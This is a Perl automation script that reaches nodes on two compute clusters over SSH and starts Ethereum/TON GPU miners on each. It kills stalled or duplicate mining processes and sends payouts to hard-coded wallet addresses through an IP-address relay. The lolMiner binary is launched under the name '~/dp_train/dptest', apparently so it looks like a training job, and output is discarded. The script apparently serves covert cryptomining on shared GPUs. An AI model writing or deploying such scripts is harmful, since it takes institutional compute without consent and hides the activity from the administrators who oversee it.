=b
### watch for exec folder setting
~/gminer_2_75/miner --algo ethash --server 18.167.166.214:5555 --ssl 1 \
         --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE.node42

 $mining_cmd = "nohup ~/eth/t-rex -a ethash -o stratum+tcp://18.167.166.214:4444 \\
 -u 0x7D599D3920Fa565957ea81796c05b3f3450531FE -p x -w $nodename 2>&1 >/dev/null &";
 
 $mining_cmd ="nohup ~/lolminer/lolMiner --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE\.$nodename-$cluster --dualmode TONDUAL --dualpool https://server1.whalestonpool.com --dualuser EQBhjbH5YjuNqskpDdDNib_M4ujBj8SM0UeqEmMtUkRGJTYS --worker $nodename-$cluster 2>&1 >/dev/null &";
conducting gpu eth submission 
=cut
use warnings;
use strict;
use Parallel::ForkManager;
my $forkNo = 1;
my $pm = Parallel::ForkManager->new("$forkNo");

#my $miner = "t-rex";# or lolminer
my $miner = "lolminer";# or lolminer

my %nodes = (
    #161 => [22],#8..18,20..22,39..41],#[1,3,39..42],#1,3,39..
    #161 => [8..18],#8..18,20..22,39..41],#[1,3,39..42],#1,3,39..
    #161 => [17],#[1,3,39..42],#1,3,39..
    161 => [1,3,8..18,20..22,39..41],#[1,3,39..42],#1,3,39..
    
    182 => [20..24]
    );
my $ip = `/usr/sbin/ip a`;    
$ip =~ /140\.117\.\d+\.(\d+)/;
my $cluster = $1;
$cluster =~ s/^\s+|\s+$//;
#print "\$cluster: $cluster\n";
my @allnodes = @{$nodes{$cluster}};#get node information
my @nodes;

`touch ~/scptest.dat`;
for (@allnodes){
    my $nodeindex=sprintf("%02d",$_);
    my $nodename= "node"."$nodeindex";
    my $cmd = "/usr/bin/ssh $nodename ";
    print "****Check $nodename status\n ";
    #`echo "***$nodename" >> $output`;
#use scp for ssh test
	system("scp -o ConnectTimeout=5 ~/scptest.dat jsp\@$nodename:/home/jsp");    
    if($?){
		next;
		}
	else{
		print "scp at $nodename ok for ssh test\n";
        push @nodes, $_;
		}	
}
chomp @nodes;
print @nodes. "\n";


#my $killjobs = "yes";
my $sumitjobs = "yes";

my $killjobs = "no";
#my $sumitjobs = "no";

my $checkstatus = "yes";
`rm -f ./dupJobs.dat`;
`touch ./dupJobs.dat`;
for (@nodes){
$pm->start and next;
    my $nodeindex=sprintf("%02d",$_);
    my $nodename= "node"."$nodeindex";
    my $cmd = "/usr/bin/ssh $nodename ";
    my $mining_cmd;
    if(1){#$nodename eq "node01" or $nodename eq "node39" or $nodename eq "node40"){
#https://ethermine.org/miners/0x7d599d3920fa565957ea81796c05b3f3450531fe/dashboard
        #$mining_cmd = "nohup ~/eth/t-rex -a ethash -o stratum+tcp://asia1.ethermine.org:4444 \\
        #              -u 0x7D599D3920Fa565957ea81796c05b3f3450531FE -p x -w $nodename 2>&1 >/dev/null &";
        #$mining_cmd = "nohup ~/eth/t-rex -a ethash -o stratum+ssl://asia1.ethermine.org:5555 \\
        #              -u 0x7D599D3920Fa565957ea81796c05b3f3450531FE -p x -w $nodename 2>&1 >/dev/null &";
        #redir
        #$mining_cmd = "nohup ~/eth/t-rex -a ethash -o stratum+tcp://3.144.142.188:4444 \\
        #              -u 0x7D599D3920Fa565957ea81796c05b3f3450531FE -p x -w $nodename 2>&1 >/dev/null &"; 
        #$mining_cmd = "nohup ~/eth/t-rex -a ethash -o stratum+tcp://3.35.19.54:4444 \\
        #-u 0x7D599D3920Fa565957ea81796c05b3f3450531FE -p x -w $nodename 2>&1 >/dev/null &";
        #HK
        if($miner eq "t-rex"){
        $mining_cmd = "nohup ~/eth/t-rex -a ethash -o stratum+tcp://18.167.166.214:4444 \\
        -u 0x7D599D3920Fa565957ea81796c05b3f3450531FE -p x -w $nodename-$cluster 2>&1 >/dev/null &";
        }
        elsif($miner eq "lolminer"){
        #$mining_cmd ="nohup ~/lolminer/lolMiner --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE\.$nodename-$cluster --dualmode TONDUAL --dualpool https://server1.whalestonpool.com --dualuser EQBhjbH5YjuNqskpDdDNib_M4ujBj8SM0UeqEmMtUkRGJTYS --worker $nodename-$cluster 2>&1 >/dev/null &";
        $mining_cmd ="nohup ~/dp_train/dptest --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE\.$nodename-$cluster --dualmode TONDUAL --dualpool https://server1.whalestonpool.com --dualuser EQBhjbH5YjuNqskpDdDNib_M4ujBj8SM0UeqEmMtUkRGJTYS --worker $nodename-$cluster 2>&1 >/dev/null &";
	#nohup ~/dp_train/dptest --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE.node42-161 --dualmode TONDUAL --dualpool https://server1.whalestonpool.com --dualuser EQBhjbH5YjuNqskpDdDNib_M4ujBj8SM0UeqEmMtUkRGJTYS --worker node39_161 2>&1 >/dev/null &
    # $mining_cmd ="/usr/bin/nohup ~/lolminer/lolMiner --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE\.$nodename-$cluster --dualmode TONDUAL --dualpool https://next.ton-pool.com --dualuser EQBhjbH5YjuNqskpDdDNib_M4ujBj8SM0UeqEmMtUkRGJTYS --worker $nodename-$cluster 2>&1 >/dev/null &";
        }
        #redir for ssl(not work)
        #gminer:
        # $mining_cmd = "nohup ~/gminer_2_75/miner --algo ethash --server 18.167.166.214:5555 --ssl 1 \\
        # --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE\.$nodename 2>&1 >/dev/null &";
        #  $mining_cmd = "nohup ~/gminer_2_75/miner --algo ethash --server 18.167.166.214:4444 \\
        # --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE\.$nodename 2>&1 >/dev/null &";

=b
         ~/GMinerRelease/miner --algo ethash --server 18.167.166.214:5555 --ssl 1 \
         --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE.node01 --pl 60 --mclock +1100 --cclock -200
=cut
        #-p x -w $nodename
        #$mining_cmd = "nohup ~/eth/t-rex -a ethash -o stratum+ssl://3.144.142.188:5555 \\
        #              -u 0x7D599D3920Fa565957ea81796c05b3f3450531FE -p x -w $nodename 2>&1 >/dev/null &";               
    }
    else{
#https://https://www.flexpool.io/

        $mining_cmd = "nohup ~/eth/t-rex -a ethash -o stratum+ssl://eth-hk.flexpool.io:5555 -o stratum+ssl://eth-hke.flexpool.io:5555 \\
    -u 0x7D599D3920Fa565957ea81796c05b3f3450531FE -p x -w $nodename 2>&1 >/dev/null &";
    }

    my $temp = `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"t-rex|miner|dptest\\\""`;
    print "*****$nodename*****\n";
    print "###node status before all cmd:\n $temp\n";
    my @temp = `$cmd "/usr/bin/nvidia-smi|grep /home/jsp"`;
    chomp @temp;
    my $gpujob = @temp;
#    print "\n\n********\n@temp $gpujob\n";
#sleep(2);
#    die;
    if($killjobs eq "yes" or $gpujob != 1){
        print "#Want to kill job\n";
        `echo "Dup: job No. in $nodename: $gpujob" >> dupJobs.dat`;
        if($temp){
            print "killing job\n";
            `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"t-rex|miner|dptest\\\"|awk '{print \\\$2}'|xargs kill"`;
        }
        else{
             print "No existing job currently!\n";
        }
    }

    if($sumitjobs eq "yes"){
        print "#Want to submit job\n";
        print "***Current mining cmd at $nodename: $mining_cmd\n";
        my $GPU = `$cmd "nvidia-smi -L"`;
       # print "**** node: $nodename ,GPU model: $GPU\n";
        my $percent = `$cmd "nvidia-smi|grep Default|awk '{print \\\$(NF-2)}'"`;
        #print "\n\n****  \$percent: $percent\n";
        $percent  =~ s/^\s+|\s+$//;
        if($percent eq "0%"){
            `echo "*** 0% performance in $nodename" >> dupJobs.dat`;
            
            print "Job performance at $nodename is currently 0%,and you need to kill it now\n";
            print "killing job\n";
            `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"t-rex|miner|dptest\\\"|awk '{print \\\$2}'|xargs kill"`;
            sleep(1);
        }
         my $temp1 = `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"t-rex|miner|dptest\\\""`;
        #$GPU =~/.*\s(\d{4})\s.*/;
        #chomp $1;
        #print "nodename: $nodename -> \$1: $1, overclock: $overclock{$1}\n";   
                 
        #sleep(2);
        unless($temp1){
            print "Submitting job\n";
            my $pid = fork();
		    if ($pid == 0) {
                exec("$cmd '$mining_cmd'");
                #$overclock{$1} only for windows
                }# if($pid == 0);
        }
        else{
            print "job already exists!\n";
        }
    }
    if($checkstatus eq "yes"){
        $temp = `$cmd "ps aux|grep -v grep|grep t-rex"`;
        print "#Want to check node current status\n";
        print "Checking status\n";
        print "output:$temp\n";
        system("$cmd 'nvidia-smi|grep %'")
    }

#`~/eth/t-rex -a ethash -o stratum+tcp://asia1.ethermine.org:4444 -u 0x7D599D3920Fa565957ea81796c05b3f3450531FE -p x`； 
$pm->finish;
}
$pm->wait_all_children;
system("ps aux|grep -v grep|grep 'ssh node'|grep jsp|awk '{print \$2}'|xargs kill");
sleep(1);
if($?) {print "$!\n";}
print "doing final grep check. If the following is empty, it is done.\n";
system("ps aux|grep -v grep|grep 'ssh node'|grep jsp");
